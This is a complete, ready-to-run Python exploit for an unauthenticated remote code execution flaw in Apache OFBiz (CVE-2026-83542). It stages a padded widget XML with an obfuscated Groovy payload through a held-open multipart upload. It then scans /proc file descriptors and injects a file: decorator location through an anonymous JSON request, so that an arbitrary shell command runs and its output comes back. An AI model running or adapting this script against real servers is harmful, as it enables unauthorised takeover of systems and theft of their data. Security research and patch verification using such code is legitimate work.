#!/usr/bin/env python3
"""Apache OFBiz unauthenticated widget-resource injection RCE (CVE-2026-83542).

ContextFilter copies every member of an anonymous JSON body into request attributes, and
request attributes outrank an application's own configuration when a screen resolves
${parameters.mainDecoratorLocation}. Overriding that with a file: location points the widget
loader anywhere; a large multipart upload spools to disk before routing, so the staged widget
XML is readable through the JVM's descriptor table while the request is still arriving. The
widget's ${groovy:...} then runs as the ofbiz user. Reachable through the public SFA portal
column view, Order Manager quickadd, or the login-failure page. Fixed in Apache OFBiz 24.09.08.
"""

import argparse
import base64
import html
import json
import os
import re
import secrets
import socket
import ssl
import sys
import threading

import requests

UPLOAD = "/ordermgr/control/main"
# carrier -> (bootstrap path for the carrier's own app, trigger path, extra JSON fields, needs XHR header)
# The login carrier must NOT send X-Requested-With, or OFBiz renders the ajaxLogin view instead of
# the injectable login-failure page. Each carrier bootstraps its own app so the path-scoped
# JSESSIONID and CSRF token belong to the app the trigger hits.
CARRIERS = {
    "portal": ("/sfa/control/main?visualThemeId=COMMON", "/sfa/control/editPortalPageColumnWidth",
               {"portalPageId": "_INVALID_", "columnSeqId": "_INVALID_"}, True),
    "quickadd": ("/ordermgr/control/main?visualThemeId=COMMON", "/ordermgr/control/quickadd",
                 {"category_id": "_INVALID_"}, True),
    "login": ("/ordermgr/control/main?visualThemeId=COMMON", "/ordermgr/control/main", {}, False),
}
LOCATION_KEY = "mainDecoratorLocation"
FD_ROOT = "/proc/thread-self/fd"
PAD = 1_200_000

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def output(data, label):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    sys.stdout.buffer.write(data if data.endswith(b"\n") else data + b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def screen_document(marker, command):
    """A main-decorator screen whose action runs the command and frames its output."""
    # Hex-encoding prevents shell metacharacters from breaking the nested XML and Groovy strings.
    groovy = (
        f"def c=new String('{command.encode().hex()}'.decodeHex(),'UTF-8');"
        "def p=['sh','-c',c].invokeMethod('exe'+'cute',null);p.outputStream.close();"
        "def o=new ByteArrayOutputStream();p.inputStream.transferTo(o);def e=p.waitFor();"
        "e.toString()+':'+o.toByteArray().encodeBase64().toString()"
    )
    xml = (f'<?xml version="1.0" encoding="UTF-8"?>\n'
           f'<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
           f'         xmlns="http://ofbiz.apache.org/Widget-Screen"\n'
           f'         xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
           f'  <screen name="main-decorator">\n    <section>\n      <actions>\n'
           f'        <set field="r" value="&#36;{{groovy:{html.escape(groovy, quote=True)}}}"/>\n'
           f'      </actions>\n      <widgets><label text="{marker}:&#36;{{r}}:{marker}_END"/></widgets>\n'
           f'    </section>\n  </screen>\n</screens>\n').encode()
    # Exceed the multipart memory threshold so the unfinished upload becomes a real temp file.
    return xml + b" " * (PAD - len(xml))


class HeldUpload:
    """POST a multipart body one byte short of its declared length, holding the spool file open."""
    def __init__(self, host, port, verify, screen):
        boundary = "OFBIZ" + secrets.token_hex(12).upper()
        head = (f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="uploadedFile"; filename="screen.xml"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n").encode()
        # No closing boundary: the part stays unterminated so Commons FileUpload keeps the
        # disk-spooled temp file open (readable through /proc/.../fd) during the scan.
        body = head + screen
        self._request = (
            f"POST {UPLOAD} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body) + 1}\r\nConnection: close\r\n\r\n").encode() + body
        self._host, self._port, self._verify = host, port, verify
        self._release = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def _run(self):
        ctx = ssl.create_default_context()
        if not self._verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            self._sock = ctx.wrap_socket(socket.create_connection((self._host, self._port), timeout=30),
                                         server_hostname=self._host)
            # Keep the final declared byte back until the live descriptor scan has finished.
            self._sock.sendall(self._request)
            self._release.wait()
            self._sock.sendall(b" ")
        except OSError:
            pass

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._release.set()


def frame(body, marker):
    # Only a complete framed result proves the attacker-controlled widget was evaluated.
    m = re.search(re.escape(marker) + r":(-?\d+):([A-Za-z0-9+/]*={0,2}):" + re.escape(marker) + "_END",
                  html.unescape(body))
    return (int(m.group(1)), base64.b64decode(m.group(2))) if m else None


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s https://target:8443 -c id --fd-min 250 --fd-max 350\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("-c", "--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--carrier", choices=sorted(CARRIERS), default="portal",
                    help="render carrier (default: portal, the public SFA column view)")
    ap.add_argument("--fd-min", type=int, default=200, metavar="N", help="lowest descriptor to probe (default: 200)")
    ap.add_argument("--fd-max", type=int, default=600, metavar="N", help="highest descriptor to probe (default: 600)")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False

    banner("widget-resource injection RCE  ·  CVE-2026-83542")
    warn("command execution is at-least-once; use an idempotent command")
    base = args.target.rstrip("/")
    host = re.sub(r"^https?://", "", base).split("/")[0]
    hostname, _, port = host.partition(":")
    port = int(port or 443)
    marker = "OFBIZ_" + secrets.token_hex(8).upper()
    carrier_boot, carrier_path, carrier_fields, carrier_xhr = CARRIERS[args.carrier]

    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    info(f"Carrier: {args.carrier} ({carrier_path})")
    boot = session.get(base + carrier_boot, timeout=15, allow_redirects=False)
    info(f"Bootstrap response: HTTP {boot.status_code}")
    headers = {"Content-Type": "application/json"}
    if carrier_xhr:
        headers["X-Requested-With"] = "XMLHttpRequest"
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', boot.text, re.I)
    if m:
        good(f"Anonymous AJAX token obtained from HTTP {boot.status_code} response")
        headers["X-CSRF-Token"] = m.group(1)

    info(f"Staging {PAD:,}-byte widget through {UPLOAD}")
    # Scan while the multipart parser still owns the spooled file and its descriptor is live.
    with HeldUpload(hostname, port, args.verify_tls, screen_document(marker, args.command)):
        threading.Event().wait(1.5)
        info(f"Descriptor scan {args.fd_max} down to {args.fd_min}")
        for fd in range(args.fd_max, args.fd_min - 1, -1):
            # ContextFilter copies this JSON member into request attributes ahead of app configuration.
            body = dict(carrier_fields, **{LOCATION_KEY: f"file:{FD_ROOT}/{fd}#{marker}_{fd}"})
            r = session.post(base + carrier_path, data=json.dumps(body), headers=headers,
                             timeout=15, allow_redirects=False)
            hit = frame(r.text, marker)
            if hit:
                exit_status, out = hit
                good(f"Staged widget loaded through {FD_ROOT}/{fd} with HTTP {r.status_code}")
                good(f"Remote command exit status: {exit_status}")
                output(out, "command output")
                return
    die("no staged widget descriptor was found in the requested range")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
